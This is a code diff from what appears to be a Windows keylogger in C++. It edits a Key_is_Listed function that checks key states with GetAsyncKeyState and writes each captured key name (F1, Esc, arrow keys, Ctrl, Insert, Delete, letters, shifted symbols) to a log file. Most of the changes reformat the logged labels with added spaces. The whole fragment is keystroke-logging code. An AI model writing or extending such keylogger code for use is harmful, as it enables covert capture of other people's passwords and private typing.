@@ -23,15 +23,14 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 	case VK_F1:
-		std::cout << "*F1*";
-		WriteToFile("*F1*");
+		std::cout << " *F1* ";
+		WriteToFile(" *F1* ");
 		break;
 
-	case 33:
+	case '!':
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
-			iKey += '!';
-			std::cout << "!";
+		    std::cout << "!";
 			WriteToFile("!");
 		}
 
@@ -57,48 +56,48 @@ bool Key_is_Listed(WORD iKey)
 		
 
 	case VK_ESCAPE:
-		std::cout << "*Esc*";
-		WriteToFile("*Esc*");
+		std::cout << " *Esc* ";
+		WriteToFile(" *Esc* ");
 		break;
 
 	case VK_UP:
-		std::cout << "btn_up";
-		WriteToFile("btn_up");
+		std::cout << " btn_up ";
+		WriteToFile(" btn_up ");
 		break;
 
 	case VK_DOWN:
-		std::cout << "btn_down";
-		WriteToFile("btn_down");
+		std::cout << " btn_down ";
+		WriteToFile(" btn_down ");
 		break; 
 
 	case VK_LEFT:
-		std::cout << "btn_left";
-		WriteToFile("btn_left");
+		std::cout << " btn_left ";
+		WriteToFile(" btn_left ");
 		break;
 
 	case VK_RIGHT:
-		std::cout << "btn_right";
-		WriteToFile("btn_right");
+		std::cout << " btn_right ";
+		WriteToFile(" btn_right ");
 		break;
 
 	case VK_CONTROL:
-		std::cout << "btn_ctrl";
-		WriteToFile("btn_ctrl");
+		std::cout << " btn_ctrl ";
+		WriteToFile(" btn_ctrl ");
 		break;
 
 	case VK_INSERT:
-		std::cout << "Insert";
-		WriteToFile("Insert");
+		std::cout << " Insert ";
+		WriteToFile(" Insert ");
 		break;
 
 	case VK_DELETE:
-		std::cout << "Delete";
-		WriteToFile("Delete");
+		std::cout << " Delete ";
+		WriteToFile(" Delete ");
 		break;
 
 	case 'A':
-		std::cout << "A";
-		WriteToFile("A");
+		std::cout << " A ";
+		WriteToFile(" A ");
 		break;
 
 	case VK_RBUTTON:
